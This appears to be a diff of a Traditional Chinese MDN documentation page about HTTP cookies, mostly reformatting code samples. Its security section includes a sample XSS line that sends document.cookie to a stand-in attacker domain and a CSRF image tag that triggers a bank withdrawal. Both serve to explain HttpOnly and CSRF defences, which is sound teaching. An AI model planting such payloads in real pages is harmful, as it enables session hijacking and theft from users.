@@ -2,6 +2,7 @@
 title: HTTP cookies
 slug: Web/HTTP/Cookies
 ---
+
 {{HTTPSidebar}}
 
 _HTTP cookie_（web cookie、browser cookie）為伺服器傳送予使用者瀏覽器的一個小片段資料。瀏覽器可能儲存並於下一次請求回傳 cookie 至相同的伺服器。Cookie 通常被用來保持使用者的登入狀態——如果兩次請求都來自相同的瀏覽器。舉例來說，它記住了[無狀態（stateless）](/zh-TW/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless)HTTP 協議的有狀態資訊。
@@ -118,7 +119,8 @@ console.log(document.cookie);
 Cookies 常用於網頁應用程式中，識別使用者與其 authenticated session，因此竊取 cookie 可能造成使用者的 authenticated session 被劫持。一般偷取 cookies 的作法包括社交工程（Social Engineering），或利用應用程式中的 {{Glossary("XSS")}} 漏洞。
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 Cookie 中的 `HttpOnly` 屬性，能藉由防止透過 JavaScript 取得 cookie 內容，來減少此類型的攻擊。
@@ -128,7 +130,8 @@ Cookie 中的 `HttpOnly` 屬性，能藉由防止透過 JavaScript 取得 cookie
 [維基百科](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)為 {{Glossary("CSRF")}} 舉了一個好例子。假設在一個未經過濾的對話或論壇中，某人插入了一個並非真實圖片，而是對你銀行伺服器請求領錢的 image：
 
 ```html
-<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+<img
+  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
 ```
 
 現在如果你的銀行帳戶仍在登入狀態中，你的 cookies 仍然有效，並且沒有其他的驗證方式，當你載入包含此圖片的 HTML 同時，你的錢即會被轉出。以下是一些避免此情況發生的技術：
